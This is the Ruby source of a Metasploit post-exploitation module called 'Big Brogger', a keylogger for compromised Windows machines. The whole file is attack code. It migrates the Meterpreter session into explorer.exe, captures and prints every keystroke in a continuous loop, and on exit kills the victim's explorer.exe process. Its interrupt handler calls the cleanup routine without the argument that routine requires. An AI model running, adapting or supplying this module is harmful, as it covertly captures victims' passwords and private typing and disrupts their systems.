##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Big Brogger',
        'Description' => %q{ Post module to capture all keyboard inputs on a Windows system. },
        'License' => MSF_LICENSE,
        'Author' => ['Tom Dejardin', 'Yohan Bordes'],
        'Platform' => ['windows'],
        'SessionTypes' => ['meterpreter']
      )
    )
  end

  def run
    # Trap SIGINT (Ctrl+C) signal
    trap('INT') { cleanup_and_exit }

    print_status('Attempting to migrate to explorer.exe...')

    begin
      # Retrieve the process list
      process_list = client.sys.process.get_processes

      # Find the PID of the explorer.exe process
      explorer_proc = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i }
      explorer_pid = explorer_proc['pid']

      # Migrate to explorer.exe process
      client.core.migrate(explorer_pid)
      print_good("Successfully migrated to explorer.exe (PID: #{explorer_pid})")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to migrate to explorer.exe: #{e.message}. Exiting...")
      return
    end

    print_status('Keylogger started...')

    # Start the keyscan capture
    client.ui.keyscan_start

    begin
      loop do
        # Retrieve captured keystrokes
        captured_keys = client.ui.keyscan_dump

        # Print the captured keys
        if captured_keys.present?
          print_status("Captured keys: #{captured_keys}")
        else
          # Sleep for a short duration to avoid high CPU usage
          sleep(1)
        end
      end
    rescue Rex::ConnectionError
      print_status('Connection error occurred. Exiting keylogger.')
    rescue Rex::RuntimeError => e
      print_error("Error occurred: #{e.message}")
    ensure
      cleanup_and_exit(explorer_proc)
    end
  end

  def cleanup_and_exit(explorer_proc)
    begin
      # Stop the keyscan capture
      client.ui.keyscan_stop
      print_status('Keylogger stopped.')

      # Kill explorer.exe process
      print_status('Attempting to kill explorer.exe...')
      client.sys.process.kill(explorer_proc['pid'])
      print_good('Successfully killed explorer.exe.')
    rescue => e
      print_error("Error during cleanup: #{e.message}")
    end
    exit
  end
end
